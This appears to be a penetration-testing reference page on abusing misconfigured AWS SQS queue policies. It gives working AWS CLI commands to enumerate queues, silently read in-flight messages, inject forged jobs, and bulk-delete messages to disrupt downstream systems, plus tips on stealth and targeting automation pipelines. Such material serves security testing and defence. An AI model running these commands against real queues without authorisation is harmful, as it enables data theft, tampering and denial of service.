---
title: "SQS: reading, injecting, and deleting queue messages"
description: "Abusing SQS queue policies to read, inject, or delete messages in another principal's queue."
keywords:
  - SQS
  - queue policy
  - message
  - inject
  - read
---

# SQS

Simple Queue Service holds application messages between a producer and its consumer. A queue's **resource policy** decides who can act on it, and when it allows a principal you hold (or is wildcarded or cross-account), you can read the messages in flight, inject forged work the consumer will process, or delete messages to break the system that depends on them.

## Enumerating queues and access

```bash
aws sqs list-queues
aws sqs get-queue-attributes --queue-url <url> --attribute-names Policy All
```

The `Policy` attribute shows which principals may `SendMessage`, `ReceiveMessage`, and `DeleteMessage`.

## Reading, injecting, and dropping

```bash
# read work in flight (long poll, do not delete so the consumer still sees it)
aws sqs receive-message --queue-url <url> --max-number-of-messages 10 --wait-time-seconds 20

# inject a forged message the consumer will process
aws sqs send-message --queue-url <url> --message-body '{"job":"forged"}'

# drop messages to deny the downstream system
aws sqs receive-message --queue-url <url> | jq -r .Messages[].ReceiptHandle | \
  xargs -I{} aws sqs delete-message --queue-url <url> --receipt-handle {}
```

## Exploitation notes

- A received message becomes invisible for its visibility-timeout window; read without deleting to stay quiet, since the consumer re-reads it after the timeout.
- Injected messages are consumer-trusted input; if the consumer is a Lambda or worker, a forged body can drive code paths or downstream calls.
- Queues feeding automation (deployments, billing, provisioning) are high value: a forged or dropped message changes what the pipeline does.

## Tools

- **AWS CLI** (`sqs receive-message` / `send-message` / `delete-message`).
- **Pacu** (`sqs__enum`): queue and policy enumeration.

## References

- [HackTricks Cloud: AWS SQS abuse](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-sqs-enum.html)
- [AWS: SQS access policy](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-overview-of-managing-access.html)
